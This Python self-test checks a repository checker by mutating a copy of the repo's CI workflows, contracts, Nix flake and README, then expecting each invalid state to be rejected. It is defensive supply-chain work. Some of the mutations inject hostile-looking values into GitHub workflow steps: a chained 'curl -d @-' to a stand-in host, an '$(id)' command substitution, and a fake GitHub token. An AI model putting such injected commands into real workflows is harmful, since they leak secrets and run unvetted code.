#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import shutil
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("repository_check", ROOT / "checks/repository.py")
assert SPEC is not None and SPEC.loader is not None
repository = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(repository)


def copy_root() -> Path:
    target = Path(tempfile.mkdtemp(prefix="envs-repository-test-")) / "repo"
    shutil.copytree(ROOT, target, ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git"))
    return target


def expect_red(mutate) -> None:
    root = copy_root()
    try:
        mutate(root)
        try:
            repository.inspect(root)
        except (repository.RepositoryError, ValueError, OSError):
            return
        raise AssertionError("invalid repository state was accepted")
    finally:
        shutil.rmtree(root.parent, ignore_errors=True)


def append_branch_effect(root: Path) -> None:
    path = root / "contracts/provider-consumer.jsonl"
    rows = [json.loads(line) for line in path.read_text().splitlines() if line]
    rows[0]["effect_source_branches"].append("main")
    path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in rows))


def mutate_plane(identity: str, change):
    def mutate(root: Path) -> None:
        path = root / "contracts/environments.jsonl"
        rows = [json.loads(line) for line in path.read_text().splitlines() if line]
        for row in rows:
            if row["id"] == identity:
                change(row)
        path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in rows))

    return mutate


def replace_text(relative: str, old: str, new: str):
    def mutate(root: Path) -> None:
        path = root / relative
        text = path.read_text(encoding="utf-8")
        assert old in text, f"{relative} fixture anchor missing"
        path.write_text(text.replace(old, new), encoding="utf-8")

    return mutate


def main() -> None:
    baseline = repository.inspect(ROOT)
    assert baseline["status"] == "PASS"
    assert baseline["canonical_branch"] == "proposals"
    assert baseline["retained_compatibility_branch"] == "main"

    expect_red(lambda root: (root / "migration").mkdir())
    expect_red(lambda root: (root / "unexpected").mkdir())
    expect_red(lambda root: (root / "adapters/legacy.sh").write_text("exit 0\n"))
    expect_red(lambda root: (root / "adapters/legacy.go").write_text("package legacy\n"))
    expect_red(lambda root: (root / "contracts/provider-consumer.jsonl").unlink())
    expect_red(append_branch_effect)

    def add_database_path(root: Path) -> None:
        name = "duck" + "db"
        (root / f"contracts/{name}.jsonl").write_text("{}\n")

    expect_red(add_database_path)

    def add_token(root: Path) -> None:
        token = "gh" + "p_" + ("A" * 30)
        (root / "contracts/token.txt").write_text(token)

    expect_red(add_token)

    def add_historical_fallback(root: Path) -> None:
        historical = "roccho-dev/" + "envs-old"
        with (root / "adapters/jev_api.py").open("a", encoding="utf-8") as stream:
            stream.write("\n# fallback " + historical + "\n")

    expect_red(add_historical_fallback)

    def propose_main_deletion(root: Path) -> None:
        with (root / "README.md").open("a", encoding="utf-8") as stream:
            stream.write("\nDelete `main` after migration.\n")

    expect_red(propose_main_deletion)
    expect_red(replace_text("README.md", "retained compatibility branch: `main`", "retained compatibility mirror: `main`"))

    obsolete_field = "age_" + "recipients"
    obsolete_source = "SOURCE_" + "JEV_API_KEY"
    author = ".github/workflows/author-dev-jev-api.yml"
    project = ".github/workflows/project-dev-jev-api.yml"
    expect_red(mutate_plane("dev.authoring", lambda row: row.update({obsolete_field: []})))
    expect_red(mutate_plane("dev.runtime", lambda row: row.update({"required_variables": []})))
    expect_red(mutate_plane("stg.projection", lambda row: row["required_variables"].clear()))
    expect_red(mutate_plane("prd.projection", lambda row: row["required_secrets"].pop()))
    expect_red(mutate_plane("dev.projection", lambda row: row["required_variables"].append(
        {"name": "EXTRA", "type": "cloudflare_account_id", "lifecycle": "persistent"})))
    expect_red(mutate_plane("dev.authoring", lambda row: row["required_secrets"][0].update(
        {"lifecycle": "persistent"})))
    expect_red(replace_text(author, "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n", ""))
    expect_red(replace_text(author, "${{ vars.SOPS_AGE_RECIPIENTS }}", "${{ secrets.SOPS_AGE_RECIPIENTS }}"))
    expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}",
                            f"{obsolete_source}: ${{{{ secrets.{obsolete_source} }}}}"))
    expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}", "JEV_API_KEY: fixture-literal"))
    expect_red(replace_text(author, "SOPS_AGE_RECIPIENTS: ${{ vars", "AGE_RECIPIENTS: ${{ vars"))
    expect_red(replace_text(project, "          CLOUDFLARE_ACCOUNT_ID:",
                            "          EXTRA: ${{ secrets.EXTRA }}\n          CLOUDFLARE_ACCOUNT_ID:"))

    # The effect entry must stay repo-owned: no ambient tool, runtime acquisition, or unlocked closure.
    entry = '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE"'
    build = "nix build .#effect-toolchain --no-update-lock-file"
    identity_step = "      - name: Record effect toolchain identity\n"
    expect_red(replace_text(author, f"{entry} author", "python3 adapters/jev_api.py author"))
    expect_red(replace_text(project, f"{entry} project", "nix shell .#effect-toolchain -c envs-effect project"))
    expect_red(replace_text(project, f"{entry} project", f"npx --yes wrangler@4 && {entry} project"))
    expect_red(replace_text(author, '"$tool/gh" pr create', "gh pr create"))
    expect_red(replace_text(author, '"$tool/git" push', "git push"))
    # Effect workflows consume the provided artifact; any rebuild or Nix install there is RED.
    expect_red(replace_text(project, identity_step, f"      - name: Rebuild\n        run: {build}\n\n{identity_step}"))
    expect_red(replace_text(author, identity_step, "      - name: Install Nix\n        uses: cachix/install-nix-action@"
                            "13d8dd58da0234aa297dedd986986ccb8e7f3e24\n\n" + identity_step))
    expect_red(lambda root: (root / "flake.lock").unlink())
    expect_red(replace_text("flake.lock", '"rev": "', '"rev": "0'))
    expect_red(replace_text("flake.nix", "wrangler = \"${pkgs.wrangler}", "wrangler = \"/usr/bin/wrangler"))
    expect_red(replace_text("adapters/jev_api.py", 'wrangler = tools["wrangler"]', 'wrangler = "npx"'))
    expect_red(replace_text(".github/workflows/check.yml", build, "nix flake show"))

    # Absolute-path, chained, or rebound executables are as ambient as bare names.
    expect_red(replace_text(author, f"{entry} author", "/usr/bin/python3 adapters/jev_api.py author"))
    expect_red(replace_text(author, '"$tool/git" push', "/usr/bin/git push"))
    expect_red(replace_text(project, '"$tool/gh" pr create', '"/usr/bin/gh" pr create'))
    expect_red(replace_text(project, 'tool="$ENVS_EFFECT_BIN"', 'tool="/usr/bin"'))
    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A; /usr/bin/curl -d @- example.invalid'))
    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A $(/usr/bin/id)'))
    expect_red(replace_text(project, "        run: |", "        shell: /usr/bin/bash {0}\n        run: |"))

    # The closure identity is recorded by the tool itself after realization and before secrets.
    identity = "      - name: Record effect toolchain identity\n" f"        run: '{entry} toolchain'\n\n"
    expect_red(replace_text(author, identity, ""))
    expect_red(replace_text(project, identity, ""))

    def move_identity_after_secrets(root: Path) -> None:
        path = root / project
        text = path.read_text(encoding="utf-8")
        path.write_text(text.replace(identity, "") + "\n" + identity, encoding="utf-8")

    expect_red(move_identity_after_secrets)

    # The committed lock must be proven Nix-generated, and the closure tools executed.
    check = ".github/workflows/check.yml"
    expect_red(replace_text(check, '          cmp flake.lock "$relock/flake.lock"\n', ""))
    expect_red(replace_text(check, '          "$tool/wrangler" --version\n', ""))
    expect_red(replace_text(check, 'pages secret "$command" --help', 'pages secret "$command"'))

    # The consumer is the clean-start consumer verbatim, resolved by the dispatched SHA, before secrets.
    consumer = "- name: Obtain provided effect artifact\n"
    verify = '          echo "${digest#sha256:}  $art/envs-effect.zip" | sha256sum -c -\n'
    expect_red(replace_text(author, verify, ""))
    expect_red(replace_text(project, "ENVS_SOURCE_SHA: ${{ github.sha }}", "ENVS_SOURCE_SHA: ${{ github.event.inputs.sha }}"))
    expect_red(replace_text(project, consumer, "- name: Obtain effect artifact\n"))

    def move_consumer_after_secrets(root: Path) -> None:
        path = root / author
        text = path.read_text(encoding="utf-8")
        step = next(block for block in text.split("\n\n") if consumer in block)
        path.write_text(text.replace(step + "\n\n", "") + "\n" + step + "\n", encoding="utf-8")

    expect_red(move_consumer_after_secrets)

    # check provides the artifact and proves a checkout-free, Nix-free clean start with destructive cases.
    expect_red(replace_text(check, "actions/upload-artifact@", "actions/upload-artifact-disabled@"))
    expect_red(replace_text(check, "nix build .#effect-artifact", "nix build .#effect-toolchain"))
    expect_red(replace_text(check, "    needs: toolchain\n", ""))
    expect_red(replace_text(check, "    timeout-minutes: 20\n    steps:\n", "    timeout-minutes: 20\n    steps:\n"
                            "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n\n"))
    expect_red(replace_text(check, verify, ""))
    expect_red(replace_text(check, 'test "$MISSING" = failure', "true"))
    expect_red(replace_text(check, "for case in lock adapter; do", "for case in lock; do"))
    expect_red(replace_text("flake.nix", "closureInfo { rootPaths = [ effect-toolchain ]; }", "closureInfo { rootPaths = [ ]; }"))
    expect_red(replace_text("flake.nix", "-I ${self}/adapters/jev_api.py", "-I adapters/jev_api.py"))
    expect_red(replace_text("README.md", "dev-projection/SOPS_AGE_KEY", "dev-projection/REMOVED"))
    expect_red(replace_text("README.md", "prd-projection/CLOUDFLARE_ACCOUNT_ID", "prd-projection/REMOVED"))
    print("repository checker self-test: PASS")


if __name__ == "__main__":
    main()
